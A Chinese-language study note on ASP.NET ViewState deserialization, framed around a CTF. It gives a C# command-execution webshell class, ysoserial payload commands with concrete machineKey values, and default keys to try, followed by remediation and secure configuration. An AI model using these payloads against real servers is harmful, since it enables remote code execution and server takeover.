<a name="rUePX"></a>
## ViewState反序列化
1、ASP.NET 在生成和解析ViewState时使用ObjectStateFormatter 进行序列化和反序列化

2、序列化后需要进行加密和签名，一旦泄露了加密和签名所使用的算法和密钥就可以将ObjectStateFormatter 的反序列化payload 伪装成正常的ViewState，并触发ObjectStateFormatter 的反序列化漏洞。

<a name="QQcEk"></a>
## 条件
需要获得以下值<br />validationKey（web.config值）、validation（web.config值）、generator(前端页面获取__VIEWSTATEGENERATOR的值)

<a name="D8fKG"></a>
## ObjectStateFormatter 反序列化demo
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664465235013-d22d91a3-f216-4e32-87cc-3fe73c8e9589.png#clientId=u4edc1904-2473-4&from=paste&height=451&id=u2b9f1fe1&originHeight=564&originWidth=1290&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57686&status=done&style=none&taskId=uc3d4ebe0-b286-4b2c-a8b6-51dce80bb26&title=&width=1032)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664465245327-4c6e88f0-9865-494c-9f07-3984b2974c64.png#clientId=u4edc1904-2473-4&from=paste&height=202&id=ubc715963&originHeight=252&originWidth=1343&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18770&status=done&style=none&taskId=ufd83a2db-e266-4ec2-a007-9c318d51f84&title=&width=1074.4)

<a name="UoIhO"></a>
## 反序列化利用
先打个问号，是通过看web.config中是否有 validationkey决定的吗？  怎么才能利用这个反序列化？<br />发现__VIEWSTATE   获取→   validationKey（web.config值）、validation（web.config值）、generator(前端页面获取__VIEWSTATEGENERATOR的值) 利用→ ysoserial.exe -p ViewState 生成反序列化payload

例如碰到了某个CTF题目<br />存在__VIEWSTATE<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664526879562-f1cdaf55-a5fc-46cc-8031-8d3a633945c0.png#clientId=u681a97d0-93e1-4&from=paste&height=658&id=ubb7f4be7&originHeight=822&originWidth=1279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66767&status=done&style=none&taskId=u1b1930eb-bcf8-43dd-8d4d-b5795f9cb26&title=&width=1023.2)<br />并且白盒中，知道了web.config中的validationKey、validation值
```
<machineKey validationKey="b07b0f97365416288cf0247cffdf135d25f6be87" decryptionKey="6f5f8bd0152af0168417716c0ccb8320e93d0133e9d06a0bb91bf87ee9d69dc3" decryption="DES" validation="MD5" />

```
<a name="t9YzR"></a>
### 命令回显 ActivitySurrogateSelectorFromFile
下面参考[Cyku](https://devco.re/blog/author/cyku)大佬的文章，构造ExploitClass.cs文件（构造带回显的 VIEWSTATE Payload，实现RCE）  [https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/](https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/)
```
class E
{
    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Form["cmd"];
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write(output);
        } catch (System.Exception) {}
        context.Response.Flush();
        context.Response.End();
    }
}

```

这个时候的-c参数就不是什么命令执行了，是通过代码去执行了，这里很关键，比如情景：如果有360的情况下，可能会拦截cmd.exe起来的进程，导致无法写入文件等操作，但是可以代码构造webshell写入文件从而接管服务器。
```
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;./System.dll;./System.Web.dll" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664527481204-38c7dd69-6e10-4e53-a661-b99159d0d03f.png#clientId=u681a97d0-93e1-4&from=paste&height=544&id=uea2955e6&originHeight=680&originWidth=1419&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58200&status=done&style=none&taskId=u355643fc-68d3-4788-af77-568376b8255&title=&width=1135.2)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664526635291-2597c7ce-6c82-4097-b50f-e882bb15a2c0.png#clientId=u681a97d0-93e1-4&from=paste&height=494&id=ufe6e37df&originHeight=618&originWidth=1741&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71495&status=done&style=none&taskId=ufb032352-9d9d-4a6f-a8f3-eb63c110d0a&title=&width=1392.8)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664526740329-ccc9e320-116d-48ca-abc0-376df74aaccb.png#clientId=u681a97d0-93e1-4&from=paste&height=720&id=uab0e2b46&originHeight=900&originWidth=925&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78869&status=done&style=none&taskId=u8d5bc784-87c4-4656-9bca-593d229bb37&title=&width=740)

<a name="sBIW4"></a>
### 命令执行 TypeConfuseDelegate 
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami && ipconfig" --generator="CA0B0334" --validationalg="SHA1" --validationkey="B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5"

<a name="LKWL7"></a>
### 关闭500响应 ActivitySurrogateDisableTypeCheck
有时候无论构造什么payload，页面都是500状态，可以先发送一次ActivitySurrogateDisableTypeCheck 然后再重新打命令回显的payload

ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c "ignore" --generator="CA0B0334" --validationalg="SHA1" --validationkey="B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5"

<a name="wdqxr"></a>
## 创建ViewState Payload版本差异
一段web.config中的machineKey
```
<machineKey validationKey="b07b0f97365416288cf0247cffdf135d25f6be87" decryptionKey="6f5f8bd0152af0168417716c0ccb8320e93d0133e9d06a0bb91bf87ee9d69dc3" decryption="DES" validation="MD5" />
```

ViewState反序列化在.NET Framwork 4.5及以上版本的时候是需要decryptionKey和decryption
```
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --decryptionalg="AES" --decryptionkey="" --validationalg="" --validationkey=""
```

在.NET Framwork 4.0及以下版本时则不需要decryptionKey和decryption
```
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --islegacy --validationalg="" --validationkey="" –isdebug
```

**总结**<br />1、.NET Framework 4.5版本之前的验证密钥及其算法；<br />2、.NET Framework 4.5或更高版本中的验证密钥、验证算法、解密密钥和解密算法

<a name="AFT9Y"></a>
## 判断mac是否有进行校验
mac其实是指machineKey   也就是web.config那几个参数的加解密算法 <br />要怎么对mac进行判断呢，其实很简单，对__VIEWSTATE参数随意进行一个base64的编码，看响应包，如果有校验的话，就会报错<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664551807507-a4609231-7ce5-428a-b3af-8c8be1a39d9d.png#clientId=u681a97d0-93e1-4&from=paste&height=638&id=ubfe5f1e9&originHeight=797&originWidth=1556&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63119&status=done&style=none&taskId=u37dcb239-fc10-46bd-83f2-e2d8adb6384&title=&width=1244.8)

如果没有校验的话，可以尝试用以下默认配置去构造payload进行攻击<br />**2014年以前微软默认的mac设置**
```
<machineKey validationKey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" decryptionKey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" validation="HMACSHA256" decryption="AES"  />
```

<a name="YPsaZ"></a>
## 修复方式
1、单台服务器可以进行动态machineKey<br />2、负载均衡服务器，可以对配置文件中machineKey的关键参数进行加密

<a name="vo6eq"></a>
## 安全的mac设置
使用AutoGenerate自动生成加解密算法
```
<system.web>  
  <machineKey validationKey="AutoGenerate,IsolateApps"   
    decryptionKey="AutoGenerate,IsolateApps"   
    validation="SHA1"/>  
</system.web>
```
<a name="XUVc2"></a>
## 学习资料
土司大神 关于反序列化详解<br />[https://www.t00ls.com/articles-55183.html](https://www.t00ls.com/articles-55183.html)

生成payload的攻击思路<br />[https://blog.csdn.net/qq_41891666/article/details/107290131](https://blog.csdn.net/qq_41891666/article/details/107290131)<br />[https://www.4hou.com/posts/OLkE](https://www.4hou.com/posts/OLkE)<br />[https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/](https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/)

[https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection?view=netframework-4.8](https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection?view=netframework-4.8)<br />__VIEWSTATE 解密站<br />[https://viewstatedecoder.azurewebsites.net/](https://viewstatedecoder.azurewebsites.net/)

底层的ViewState代码调试<br />[https://www.anquanke.com/post/id/221630](https://www.anquanke.com/post/id/221630)


Asp.Net的很多加密，都是依赖于machineKey的设置，例如Forms 身份验证 Cookie、ViewState的加密。**默认情况下，Asp.Net的配置是自己动态生成**，validationKey和decryptionKey的默认值是AutoGenerate。如果单台服务器当然没问题，**但是如果多台服务器负载均衡**，machineKey还采用动态生成的方式，每台服务器上的machinekey值不一致，就导致加密出来的结果也不一致，**不能共享验证和ViewState**，所以对于多台服务器负载均衡的情况，一定要在每台站点配置相同的machineKey。

<a name="WYxr2"></a>
## 最后的疑惑？
白盒要怎么才能找到ViewState反序列化的点呢？
